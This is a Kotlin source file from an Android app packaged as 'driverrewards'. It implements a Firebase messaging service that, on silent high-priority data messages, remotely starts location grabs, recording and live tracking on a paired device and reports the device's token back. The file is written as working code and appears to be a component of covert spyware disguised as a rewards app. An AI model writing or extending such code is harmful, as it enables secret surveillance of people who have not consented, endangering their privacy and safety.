// Package: com.sm.driverrewards.service
// Firebase Cloud Messaging service for silent wake-up and command execution
package com.sm.driverrewards.service

import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.sm.core.model.CommandType
import com.sm.driverrewards.data.local.AgentPreferences
import com.sm.driverrewards.data.repository.AgentRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class FcmPushService : FirebaseMessagingService() {

    private val repository = AgentRepository()

    /**
     * Naya FCM token aane par preferences me save aur Supabase me sync karte hain
     */
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        val prefs = AgentPreferences(this)
        prefs.setFcmToken(token)

        if (prefs.isPaired()) {
            CoroutineScope(Dispatchers.IO).launch {
                repository.sendHeartbeat(
                    deviceId = prefs.getDeviceId(),
                    batteryLevel = 100,
                    isCharging = false,
                    fcmToken = token
                )
            }
        }
    }

    /**
     * Silent high-priority FCM data message receive hone par trigger hota hai
     */
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        val prefs = AgentPreferences(this)
        if (!prefs.isPaired()) return

        // Data payload read karte hain
        val data = remoteMessage.data
        if (data.isEmpty()) return

        val commandId = data["command_id"] ?: ""
        val commandType = data["command_type"] ?: data["action"] ?: ""
        val durationMinutes = data["duration_minutes"]?.toIntOrNull() ?: 5
        val highAccuracy = data["high_accuracy"]?.toBooleanStrictOrNull() ?: false

        if (commandType.isNotBlank()) {
            when (commandType) {
                CommandType.GET_LOCATION,
                CommandType.START_RECORDING,
                CommandType.LIVE_TRACK -> {
                    TelemetryExecutionService.startCommand(
                        context = this,
                        commandId = commandId,
                        commandType = commandType,
                        durationMinutes = durationMinutes,
                        highAccuracy = highAccuracy
                    )
                }
                CommandType.STOP_RECORDING -> {
                    TelemetryExecutionService.stopTask(this)
                }
            }
        }
    }
}
